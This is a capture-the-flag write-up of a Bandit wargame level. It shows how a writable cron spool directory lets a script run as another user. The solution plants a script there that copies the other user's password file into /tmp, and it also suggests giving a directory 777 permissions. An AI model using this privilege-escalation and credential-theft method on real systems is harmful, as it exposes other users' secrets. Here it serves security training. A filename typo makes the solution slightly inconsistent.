# Level 23-24


## Level Goals

> A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.  

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!  

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


## Commands you may need to solve this level
> cron, crontab, crontab(5) (use “man 5 crontab” to access this)  

## write-up

	bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh 
	#!/bin/bash
	
	myname=$(whoami)
	
	cd /var/spool/$myname
	echo "Executing and deleting all scripts in /var/spool/$myname:"
	for i in * .*;
	do
	    if [ "$i" != "." -a "$i" != ".." ];
	    then
		echo "Handling $i"
		timeout -s 9 60 ./$i
		rm -f ./$i
	    fi
	done

This script is executing every file in `var/spool/bandit24` a/s a user `bandit24`.  

Let's look at this `var/spool/bandit24` directory.
	bandit23@bandit:~$ ls -la /var/spool
	total 20
	drwxr-xr-x  5 root     root     4096 Dec 28 14:34 .
	drwxr-xr-x 12 root     root     4096 Dec 28 14:34 ..
	drwx-wx--- 10 bandit24 bandit23 4096 Jun 14 23:22 bandit24
	drwxr-xr-x  5 root     root     4096 Oct 31  2017 cron
	lrwxrwxrwx  1 root     root        7 Oct 31  2017 mail -> ../mail
	drwx------  2 syslog   adm      4096 Apr  5  2016 rsyslog  

We have `write` & `execute` permissions.  
As `bandit24` can only read `/etc/bandit_pass/bandit24`, we can write a script that will read `/etc/bandit_pass/bandit24` and copy it to `var/spool/bandit24` where it will be exeuted by `bandit24`. We will redirect the output of `cat /etc/bandit_pass/bandit24` to a file `bandit23` can read.  
Here's the script:  
##### /tmp/myscript.sh
	#!/bin/bash
	cat /etc/bandit_pass/bandit24 > /tmp/bandi24pass.txt

Give it executable permissions `chmod +x /tmp/myscript.sh`  
`cp /tmp/myscript.sh /var/spool/bandit24/`  
Then wait for the file `/tmp/bandit24pass.txt` to be created.  

##### Note:
If you create a directory in `/tmp/`, then give it `777` permissions to make it writable and executbale by `bandit24`.
